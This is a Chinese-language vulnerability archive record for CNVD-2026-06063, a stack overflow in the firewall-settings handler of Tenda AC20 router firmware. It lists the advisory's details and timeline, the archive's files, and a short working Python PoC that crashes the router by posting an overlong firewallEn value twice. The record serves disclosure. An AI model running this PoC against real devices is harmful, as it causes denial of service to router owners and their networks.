# CNVD-2026-06063 归档记录（已收录）

## 漏洞概要

- **产品**：深圳市吉祥腾达科技有限公司 Tenda AC20 路由器，固件 V16.03.08.12（US_AC20V1.0re_V16.03.08.12_cn_TDC01）
- **类型**：通用型漏洞 / 拒绝服务（栈溢出，CWE-120）
- **位置**：`httpd` 中 `formSetFirewallCfg`，`firewallEn` 输入未检查长度上限，栈溢出导致程序崩溃或命令行劫持
- **影响**：远程拒绝服务（需请求两次触发宕机）
- **危害级别**：中危（通用—网络设备）

## 编号与时间线

- **CNVD-ID**：CNVD-2026-06063（事件编号 CNVD-C-2025-706854）
- **原创漏洞证明**：CNVD-YCGN-202611093732
- **收录时间**：2025-10-23；**通报日期**：2025-11-07
- **CNVD 报告页**：https://www.cnvd.org.cn/user/myreport/25252686

## 目录说明

- `关于深圳市吉祥腾达科技有限公司Tenda AC20存在拒绝服务漏洞的情况通报.docx` — CNVD 通报原文（含 qemu-mipsel-static 仿真复现步骤）
- `exp.py` — 破坏 PoC
- `US_AC20V1.0re_V16.03.08.12_cn_TDC01.bin/.zip/.tar` — 固件与解包产物
- `squashfs-root/` — 固件解包文件系统
- `漏洞复现视频.mp4` — 宕机演示视频

## PoC

```python
import requests
ip = "192.168.10.1"
url = "http://" + ip + "/goform/SetFirewallCfg"
payload = b"a" * 1000
data = {"firewallEn": payload}
response = requests.post(url, data=data)
response = requests.post(url, data=data)
print(response.text)
```
